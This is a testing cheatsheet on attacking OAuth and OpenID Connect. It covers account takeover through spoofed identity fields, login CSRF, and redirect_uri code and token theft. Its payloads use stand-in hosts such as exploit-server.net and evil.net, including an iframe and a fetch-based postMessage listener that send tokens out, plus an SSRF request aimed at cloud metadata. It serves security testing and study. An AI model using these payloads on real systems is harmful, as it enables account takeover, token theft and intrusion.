# OAuth Cheatsheet

Quick-reference only — assumes you already know the fundamentals (4 entities, auth code vs implicit flow, scopes, state param).

---

## 1. Recon / Identification

- "Log in with X" → likely OAuth. Confirm via proxy: look for `GET /authorization?...` with `client_id`, `redirect_uri`, `response_type`.
- Check hostname of authorization server → look up provider's public docs for endpoints.
- Fetch config files for extra attack surface:
  - `/.well-known/oauth-authorization-server`
  - `/.well-known/openid-configuration` (OIDC)
- OIDC tell: mandatory `openid` scope present in the request. If absent, try adding `scope=openid` or `response_type=id_token` manually — provider may still support it silently.

---

## 2. Client-Side (App Implementation) Bugs

### 2.1 Improper implicit-grant handling → identity spoofing
Client sends identity fields (`email`, `username`) **in the POST body** to its own `/authenticate` endpoint alongside the token, instead of re-deriving identity server-side from the token itself.

**Exploit:** capture the `/authenticate` request → swap `email` to victim's → keep your own valid token → send. `302` + session cookie with no error = account takeover.

```
POST /authenticate
{"email":"<victim_email>","username":"<attacker>","token":"<attacker's valid token>"}
```

### 2.2 Missing/flawed `state` → login CSRF
No `state` param on the authorization request (esp. on **account-linking** flows, not just login) → attacker can steal their own unused `code`, embed it in a cross-site request, and get the victim's browser to complete the link/login using the attacker's identity.

**Exploit pattern:**
1. Start linking flow as attacker, intercept & drop the final `GET /oauth-linking?code=...` (keeps code unused).
2. Host `<iframe src="https://target/oauth-linking?code=STOLEN">` on exploit server.
3. Deliver to victim → their session completes the link → attacker's identity now bound to victim's account.

---

## 3. OAuth Service (Provider) Bugs

### 3.1 `redirect_uri` not validated at all → code/token theft
If any external `redirect_uri` is accepted, the auth code/token can be redirected straight to an attacker server via a CSRF-shaped attack (attacker starts the flow, victim's browser completes it).

```html
<iframe src="https://oauth-service.com/auth?client_id=X&redirect_uri=https://exploit-server.net&response_type=code&scope=..."></iframe>
```
- `state`/`nonce` do **not** protect against this — attacker generates their own valid ones.
- Auth code: replay stolen code against the **client app's legitimate callback** (not your own server) to inherit victim's session. `client_secret` never needed.
- Implicit: stolen `access_token` usable directly against provider's resource endpoints — no replay needed.
- **Fix:** provider must require `redirect_uri` resubmitted at code-exchange and match original.

### 3.2 Flawed `redirect_uri` whitelist validation
Whitelist exists but is bypassable:

| Technique | Payload shape |
|---|---|
| Prefix/startswith matching | `callback/../evil`, `callback?redirect=evil.com` |
| Parser discrepancy (validator vs redirect logic disagree) | `https://good.com &@evil.net#@evil.net/` |
| Parameter pollution (dup `redirect_uri`) | `redirect_uri=good.com&redirect_uri=evil.net` |
| `localhost` exception abuse | `redirect_uri=https://localhost.evil-user.net` |

Re-test all of the above after changing `response_mode` (`query`/`fragment`/`web_message`) — validation can differ per mode.

### 3.3 Stealing code/token via same-domain proxy page
When `redirect_uri` can't leave the whitelist domain but *can* be traversal-tampered to another in-domain page — chain to a page that leaks the code (query) or fragment (needs JS, since fragments aren't sent server-side).

**Pattern A — open redirect as proxy:**
```
redirect_uri=https://client-app.com/oauth-callback/../post/next?path=https://exploit-server.net/exploit
```
Exploit page reads `location.hash` and re-navigates to leak it:
```html
<script>window.location = '/?' + document.location.hash.substr(1)</script>
```

**Pattern B — `postMessage(..., '*')` as proxy:**
Traverse to a page that broadcasts `window.location.href` via wildcard-origin `postMessage`. Embed it in your own iframe and listen:
```html
<iframe src="https://oauth-service.com/auth?...&redirect_uri=.../comment-form&response_type=token&..."></iframe>
<script>
  window.addEventListener('message', e => fetch("/" + encodeURIComponent(e.data.data)));
</script>
```

**Other leak vectors to check on the proxy page:** dangerous JS reading `location.hash`/`.search`, XSS (turns short-lived session theft into durable token theft), HTML injection without JS (`<img src="evil.net">` — `Referer` leaks the full URL/code on some browsers).

### 3.4 Flawed scope validation (scope upgrade)

| | Auth code flow | Implicit flow |
|---|---|---|
| Requirement | Register your **own** client app | Any stolen token |
| Where tampered | `scope` param on `/token` exchange | `scope` param on direct `/userinfo` request |
| Bug | Server trusts exchange-time scope over originally-approved scope | Server trusts request-time scope over token's issued scope |

```
POST /token
...&grant_type=authorization_code&code=...&scope=openid%20email%20profile   <- upgraded from originally-approved "openid email"
```
Tell: response `scope` broader than what the consent screen showed. Implicit-flow upgrade capped by what the client app is generally allowed to request.

### 3.5 Unverified user registration (at the provider)
If the OAuth **provider itself** lets anyone register with an unverified email, an attacker registers using the victim's email → logs into the client app via that fraudulent account → client app trusts the email claim → attacker lands in victim's account (or provisions one under victim's email for later hijack). Not a client-app or protocol bug — check the provider's own signup flow for missing email verification.

---

## 4. OpenID Connect (OIDC)-Specific Bugs

### 4.1 Unprotected dynamic client registration → SSRF
`POST /registration`-style endpoint accepts new client apps with no auth. Fields like `logo_uri`, `jwks_uri` may be fetched **server-side** by the provider (e.g. rendering a logo on the consent screen) → classic SSRF.

```
POST /reg
{"redirect_uris":["https://example.com"], "logo_uri":"http://169.254.169.254/latest/meta-data/..."}
```
Confirm via out-of-band (Collaborator) before pivoting to internal targets (cloud metadata, internal admin panels).

### 4.2 Authorization requests "by reference" (`request_uri`)
Instead of params in the query string, `request_uri=https://attacker/params.jwt` — provider fetches & decodes the JWT for actual params.

Two bugs to check:
1. **SSRF** — provider fetches attacker-hosted `request_uri` blindly. Confirm via Collaborator.
2. **Validation bypass** — `redirect_uri` validation may only be wired to the query-string path, not the JWT-decoded path. Baseline: confirm a malicious `redirect_uri` is rejected by-value → retry the same value packaged inside the referenced JWT → if accepted, all of Section 3.1–3.3 reopens through this parameter.

Check support: `/.well-known/openid-configuration` → `request_uri_parameter_supported`, or just try adding `request_uri` manually.

---

## 5. Testing Checklist (run through in order)

1. Confirm OAuth in use (recon section) + identify grant type + check for OIDC.
2. Client app: check `/authenticate`-style endpoint for body-trusted identity fields (2.1).
3. Check `state` param presence on **every** OAuth-triggered action, not just login (2.2).
4. `redirect_uri`: try fully external domain first (3.1) → then whitelist bypass techniques (3.2) → then same-domain proxy chaining (3.3).
5. Test scope upgrade on both token-exchange (auth code) and userinfo request (implicit) (3.4).
6. If provider is in scope: check registration email verification (3.5).
7. If OIDC: check dynamic registration auth (4.1) and `request_uri` support/validation (4.2).
